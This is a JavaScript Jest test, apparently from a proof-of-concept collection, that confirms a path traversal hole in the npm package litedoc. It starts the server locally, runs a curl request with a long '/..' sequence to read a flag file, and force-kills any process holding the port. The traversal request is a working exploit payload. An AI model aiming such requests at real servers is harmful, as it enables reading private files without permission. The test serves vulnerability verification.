//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/litedoc/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in litedoc", (done) => {
  const pkg = require("litedoc");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");

  try{
    a.execSync('fuser -k 18080/tcp',()=>{})//killing any other process using the same port
  }catch(e){}

  pkg.start();

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:18080${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
